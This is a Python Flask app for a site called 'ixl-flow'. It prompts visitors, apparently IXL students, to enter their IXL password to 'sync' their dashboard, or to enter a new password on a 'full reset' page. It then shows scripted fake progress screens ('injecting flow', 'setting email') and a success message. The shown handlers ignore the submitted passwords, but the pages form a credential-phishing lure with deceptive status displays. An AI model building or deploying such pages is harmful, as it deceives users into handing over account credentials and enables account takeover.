from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- STYLES (Deep Black & Glowing Pink) ---
STYLE = """
<style>
    body { background-color: #020202; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
    .card { background: #080808; padding: 40px; border-radius: 24px; text-align: center; box-shadow: 0 0 50px rgba(255, 20, 147, 0.2); width: 90%; max-width: 380px; border: 1px solid #1a1a1a; display: flex; flex-direction: column; gap: 15px; box-sizing: border-box; }
    h1 span, h2 { color: #ff1493; text-shadow: 0 0 15px rgba(255, 20, 147, 0.7); font-weight: 800; margin: 0; text-transform: lowercase; }
    .step { background: #111; padding: 15px; border-radius: 12px; text-align: left; border-left: 4px solid #ff1493; font-size: 14px; line-height: 1.4; }
    input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #222; background: #000; color: white; box-sizing: border-box; outline: none; font-size: 14px; margin-top: 5px; }
    input:focus { border-color: #ff1493; box-shadow: 0 0 10px rgba(255, 20, 147, 0.3); }
    .btn-glow { background: #ff1493; color: white; padding: 16px; border-radius: 30px; font-weight: bold; text-decoration: none; border: none; width: 100%; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 20px rgba(255, 20, 147, 0.4); box-sizing: border-box; display: block; transition: 0.2s; }
    .btn-glow:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(255, 20, 147, 0.6); }
    .link-alt { color: #444; font-size: 11px; text-decoration: none; margin-top: 5px; display: block; }
    .link-alt:hover { color: #ff1493; }
    ul { list-style: none; padding: 0; text-align: left; margin: 0; }
    li { margin: 12px 0; color: #222; font-size: 14px; display: flex; align-items: center; }
    li.done { color: #ff1493; }
    li.active { color: #ff1493; font-weight: bold; animation: pulse 1.5s infinite; }
    .dot { height: 6px; width: 6px; border-radius: 50%; display: inline-block; margin-right: 12px; background: #1a1a1a; }
    li.done .dot { background: #ff1493; box-shadow: 0 0 10px #ff1493; }
    li.active .dot { background: #ff1493; box-shadow: 0 0 15px #ff1493; }
    @keyframes pulse { 0% { opacity: 0.5; } 100% { opacity: 1; } }
</style>
"""

@app.route('/')
def home():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h1>ixl-<span>flow</span></h1>
            <div class="step"><strong>1.</strong> Stay logged into IXL.</div>
            <div class="step"><strong>2.</strong> Link your dashboard below:</div>
            <a class="btn-glow" href="/login">LINK IXL DASHBOARD</a>
        </div>
    </body></html>
    """)

@app.route('/login')
def login():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2>confirm sync</h2>
            <p style="color: #444; font-size: 12px; margin: 0;">Enter your password to link account.</p>
            <form action="/run_sync" method="POST" style="display: flex; flex-direction: column; gap: 10px;">
                <input type="password" name="password" placeholder="ixl password" required>
                <button type="submit" class="btn-glow">SYNC ACCOUNT</button>
            </form>
            <a href="/reset_request" class="link-alt">I don't know my password</a>
        </div>
    </body></html>
    """)

@app.route('/reset_request')
def reset_request():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2>reset password</h2>
            <form action="/reset_status" method="POST" style="display: flex; flex-direction: column; gap: 10px;">
                <input type="password" name="new_password" placeholder="new password" required>
                <button type="submit" class="btn-glow">START FULL RESET</button>
            </form>
        </div>
    </body></html>
    """)

@app.route('/reset_status', methods=['POST'])
def reset_status():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2>resetting...</h2>
            <ul>
                <li class="done"><span class="dot"></span>setting email</li>
                <li class="done"><span class="dot"></span>resetting password</li>
                <li class="active"><span class="dot"></span>waiting for reset...</li>
                <li><span class="dot"></span>logging back in</li>
            </ul>
        </div>
        <script>setTimeout(function(){{ window.location.href='/success'; }}, 5000);</script>
    </body></html>
    """)

@app.route('/run_sync', methods=['POST'])
def run_sync():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2>syncing...</h2>
            <ul>
                <li class="active"><span class="dot"></span>establishing socket</li>
                <li><span class="dot"></span>pulling metadata</li>
                <li><span class="dot"></span>injecting flow</li>
            </ul>
        </div>
        <script>setTimeout(function(){{ window.location.href='/success'; }}, 4000);</script>
    </body></html>
    """)

@app.route('/success')
def success():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2>sync complete</h2>
            <div class="step" style="text-align: center; border: none;">
                <p>Dashboard linked successfully.</p>
                <p style="color: #ff1493; font-weight: bold;">Flow is now active.</p>
            </div>
            <a class="btn-glow" href="/">RETURN HOME</a>
        </div>
    </body></html>
    """)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
